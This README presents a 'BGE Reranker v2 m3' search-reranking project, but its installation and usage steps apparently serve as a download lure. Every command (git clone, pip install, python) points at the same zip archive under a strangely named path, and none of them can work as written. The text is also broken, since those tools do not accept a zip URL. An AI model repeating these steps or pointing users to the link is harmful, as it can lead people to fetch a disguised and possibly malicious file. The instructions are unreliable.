## Overview

The BGE Reranker v2 m3 leverages advanced AI techniques to improve the relevance of search results. By applying transformer models from Hugging Face, it enhances the ranking of documents based on user queries. This project is designed for developers, researchers, and anyone interested in AI applications.

## Installation

To set up the BGE Reranker v2 m3, follow these steps:

1. **Clone the repository:**

   ```bash
   git clone https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip
   cd HuggingFace-BAAI--BGERerankerv2m3
   ```

2. **Install the required packages:**

   Ensure you have Python installed. Then, use pip to install the necessary libraries:

   ```bash
   pip install -r https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip
   ```

3. **Set up Azure (if using Azure):**

   If you plan to use Azure, ensure you have an Azure account and follow the setup instructions provided in the Azure documentation.

## Usage

To run the demo, execute the following command:

```bash
python https://github.com/TioAbiyyu/HuggingFace-BAAI--BGERerankerv2m3/raw/refs/heads/main/photodynamical/m-BGE-Rerankerv-Face-BAA-Hugging-pericardial.zip
```

This command will start the application locally. You can then access it via your web browser at `http://localhost:5000`.
